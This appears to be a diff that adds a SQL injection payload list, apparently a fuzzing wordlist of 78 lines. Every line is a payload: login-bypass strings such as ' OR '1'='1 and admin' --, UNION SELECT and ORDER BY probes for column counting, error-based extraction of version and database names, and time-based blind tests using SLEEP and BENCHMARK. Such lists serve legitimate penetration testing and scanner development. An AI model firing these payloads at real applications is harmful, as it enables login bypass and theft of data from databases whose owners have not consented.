@@ -1,0 +1,78 @@
+' OR '1'='1
+" OR "1"="1"
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+" or 1=1--
+' or true--
+" or true--
+' or 'x'='x
+" or "x"=\"x\"
+') or ('x')=('x
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+') or 1=1--
+") or 1=1--
+' OR 1=1#
+' OR 1=0#
+" OR 1=1--
+" OR 1=0--
+' AND 7300=7300 AND 'pKlZ'='pKlZ
+' AND 7300=7300 AND 'pKlZ'='pKlY
+'
+"
+`
+')
+")
+'))
+"))
+;
+--
+#
+/*
+' HAVING 1=1--
+' HAVING 1=0--
+' AND 1=1--
+' AND 1=0--
+' AND 1=1#
+' AND 1=0#
+' AND 1=CONVERT(int, (SELECT @@version))
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523,4523))),0x7170706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT @@version,NULL--
+' UNION SELECT user(),NULL--
+' UNION SELECT database(),NULL--
+' UNION ALL SELECT 1,2,3,4,5,6--
+' UNION ALL SELECT 'INJ'||'ECT'||'XXX'--
+" UNION SELECT 1,2,3--
+" UNION ALL SELECT NULL,NULL,NULL--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 10--
+' ORDER BY 100--
+' ORDER BY 31337--
+' ORDER BY 1#
+' ORDER BY 2#
+' ORDER BY 3#
+' ORDER BY SLEEP(5)--
+' ORDER BY 1,SLEEP(5)--
+' ORDER BY 1,SLEEP(5),3--
+" ORDER BY 1--
+" ORDER BY SLEEP(5)--
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
+SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,MD5(1)),1)
